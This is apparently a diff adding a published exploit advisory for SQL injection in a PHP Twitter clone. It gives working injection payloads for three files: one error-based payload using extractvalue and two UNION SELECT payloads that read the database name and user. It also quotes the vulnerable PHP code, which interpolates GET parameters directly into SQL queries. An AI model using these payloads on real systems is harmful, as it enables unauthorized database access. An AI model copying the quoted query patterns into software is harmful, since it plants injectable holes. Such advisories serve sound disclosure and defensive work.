@@ -1,0 +1,64 @@
+# Exploit Title: Twitter-Clone 1 - 'code' SQL Injection
+# Date: 2018-08-22
+# Exploit Author: L0RD
+# Vendor Homepage: https://github.com/Fyffe/PHP-Twitter-Clone/
+# Version: 1
+# CVE: N/A
+# Tested on: Win 10
+# vulnerable files : [mailactivation.php , stalkers.php , search.php]
+# vulnerable parameters : [name , code , id]
+
+# 1) search.php :
+# vulnerable parameter : name
+# Type : Error-based
+# Payload : 
+
+%' AND extractvalue(1,concat(0x3a,database(),0x3a))%23
+
+# vulnerable code :
+if($_GET['name']!=""){
+$what = $_GET['name'];
+include "connect.php";
+$users = mysqli_query($con, "SELECT id, username, followers, following,
+tweets
+  FROM users
+ WHERE username LIKE '%$what%'
+ ORDER BY username ASC
+ LIMIT 0, 10
+");
+
+# 2) mailactivation.php :
+# vulnerable parameter : code
+# Type : Union query
+# Payload : 
+
+' UNION SELECT 1,user(),3,4,5,6%23
+
+# vulnerable code :
+include "connect.php";
+$givenname = $_GET['username'];
+$givencode = $_GET['code'];
+$query = mysqli_query($con, "SELECT code, active
+  FROM users
+  WHERE code = '$givencode' AND username = '$givenname'
+ ");
+$row = mysqli_fetch_assoc($query);
+$wantedcode = $row['code'];
+
+# 3) stalkers.php :
+# vulnerable parameter : id
+# Type : Union query
+# Payload : 
+
+' UNION SELECT 1,2,user(),4,5,6
+
+# vulnerable code :
+if ($_GET['id'] != "") {
+$theid = $_GET['id'];
+include "connect.php";
+$stalked = mysqli_query($con, "SELECT id, username, followers, following
+ FROM users
+  WHERE id = '$theid'
+");
+$row1 = mysqli_fetch_assoc($stalked);
+$usern = $row1['username'];
